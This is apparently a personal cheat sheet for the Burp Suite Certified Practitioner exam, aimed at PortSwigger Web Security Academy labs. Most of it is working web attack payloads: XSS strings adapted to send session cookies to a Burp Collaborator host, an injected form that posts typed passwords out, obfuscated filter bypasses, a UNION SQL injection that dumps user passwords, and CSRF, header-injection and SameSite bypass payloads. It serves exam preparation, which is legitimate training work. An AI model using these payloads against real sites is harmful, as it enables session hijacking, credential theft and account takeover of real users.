# Useful info for BSCP
## Extensions for Burp Suite:
* Active Scan++
* Hackvertor
* Collaborator Everywhere
* HTTP Request Smuggler
* Scan manual insertion point
* JWT Editor
* InQL - GraphQL Scanner
* Content Type Convertor
* Server-Side Prototype Pollution Scanner
* DOM Invader (burp browser)

## Tips:
1. Use targeted scan (in Intruder highlight insertion point and use option run targeted scan)  
2. Passas much mystery labs as possible and note and repeat those with mistakes
3. Review all labs solutions

## XSS
1. If "Search" or "Comments" functionality is present - scan them for XSS.

### Payloads
1. DOM XSS in document.write sink using source location.search inside a select element:
* Add parameter to URL `product?productId=1&storeId=kek` and check out it is in dropbox on the product site. Check HTML code and find out, that storeId is in `<select>` tag. Create the next payload:
```
storeId=kek"></select><script>alert(1)</script>
```
Adapted version:
```
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```
2. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded.
```
{{constructor.constructor('alert(1)')()}}
```
Adapted version:
```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```
3. Reflected DOM XSS
```
\"-alert()}//
```
Adapted:
```
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```
4. Stored DOM XSS
Function replaces first angle brakets only:
```
<><img src=1 onerror=alert(1)>
```
Adapted:
```
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```
5. Exploiting cross-site scripting to steal cookies
```
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```
6. Exploiting cross-site scripting to capture passwords
You can create new form in comment section to steal passwords
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
7. Exploiting XSS to perform CSRF
There is protection against CSRF, so we need to use the other user's CSRF token in our payload
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() 
{    
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
var changeReq = new XMLHttpRequest();    
changeReq.open('post', '/my-account/change-email', true);    
changeReq.send('csrf='+token+'&email=test@test.com')};
</script>
```
8. Reflected XSS into HTML context with most tags and attributes blocked
BruteForce all tags by using xss cheat-sheet, then:
```
<iframe src="https://0a61001b0306cecac0be0a5000570086.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
Adapted:
```
<script>
location = 'https://kek.web-security-academy.net/?query=<body onload=document.location='https://burp.oastify.com/?c='+document.cookie tabindex=1>#x';
</script>

ULR Encoded:

<script>
location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```
9. Reflected XSS into HTML context with all tags blocked except custom ones
```
<script>
location='https://kek.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```
Adapted:
```
<xss id=x onfocus=document.location="http://burp.oastify.com/?c="+document.cookie tabindex=1>#x

ULR Encoded:

%3Cxss%20id=x%20onfocus=document.location=%22http://burp.oastify.com/?c=%22+document.cookie%20tabindex=1%3E#x
```
10. Reflected XSS with some SVG markup allowed
```
<svg><animatetransform onbegin=alert(1)> 
```
Adapted:
```
<svg><animatetransform onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;>

URL Encoded:

%3Csvg%3E%3Canimatetransform%20onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;%3E
```
11. Reflected XSS in canonical link tag
```
'accesskey='x'onclick='alert(1)
```
12. Reflected XSS into a JavaScript string with single quote and backslash escaped
```
</script><script>alert(1)</script>
```
Adapted:
```
</script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>
```
13. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
```
\';alert(1);//
\'-alert(1)//
```
Adapted:
```
\';document.location=`http://burp.oastify.com/?c=`+document.cookie;//
```
14. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
```
http://foo?&apos;-alert(1)-&apos;
```
15. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
```
${alert(1)}
```
### Bypasses:
```
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >
```

```
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

```
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
## SQL injections
If you have `Advanced Search` page on your exam, you are more likely about to get easy priv escalation.  
Also check `TrackingId` cookie  
Run `sqlmap` with risk 3 and level 5  
Also SQL injection vector could be potentially found in XML (stock check functionality) and it would not be found with sqlmap. We need to exploit it using Hackvertor entity encoding:
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```
## CSRF
Arises in update email functionality  
Potentially the main goal of CSRF is to change admin's mail and then reset his password.  
Generate CSRF PoC of update-email page with Burp and try to bypass restrictions:
* Сhange request method.
* Just delete CSRF token.
* Before using CSRF token in request, check it in HTML code and perform a CSRF attack with it.
More complex cases:
1. CSRF where token is tied to non-session cookie
Observe LastSearchTerm in Set-Cookie header. Change it to `/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY` and create the next payload to set this key to victim:
```
<script>
location="https://xxx.web-security-academy.net/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"
</script>
```
Now simply generate CSRF PoC and send it.
2. CSRF where token is duplicated in cookie
Same as previous:
```
/?search=w%0d%0aSet-Cookie:%20csrf=kek%3b%20SameSite=None
```
3. SameSite Lax bypass via method override
Change request method to GET and add `_method=POST` parameter:
```
/my-account/change-email?email=ww%40gmail.com&_method=POST
```
4. SameSite Strict bypass via client-side redirect
```
/post/comment/confirmation?postId=7../../../my-account/change-email?email=ww%40gmail.com%26submit=1
```
5.  SameSite Strict bypass via sibling domain
Observe there is `cms-xxx.web-security-academy.net` domain. Craft the next payload and full URL-encode it.
```
<script>
    var ws = new WebSocket('wss://your-websocket-url/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
Create next payload and send it to victim:
```
<script>
location="https://cms-xxx.web-security-academy.net/login?username=URL-ENCODED-PAYLOAD&password=peter"
</script>
```
6. SameSite Lax bypass via cookie refresh
Create CSRF PoC. Send it to victim once, wait 5-10 seconds and send it again.
7. CSRF Refresh Password isloggedin true
Observer username and stayloggedin values in cookie  
Create POST request to change password or email and add `X-Forwarded-Host`, `X-Host`, `X_Forwarded-Server` pointing to exploit server  
Add a parameter `username=administrator` to request's body and send it  
## Clickjacking

## DOM-based vulnerabilities
Use `DOM Invader`  
### Exploits
1. DOM XSS using web messages
Notice that the home page contains an `addEventListener()` call that listens for a web message  
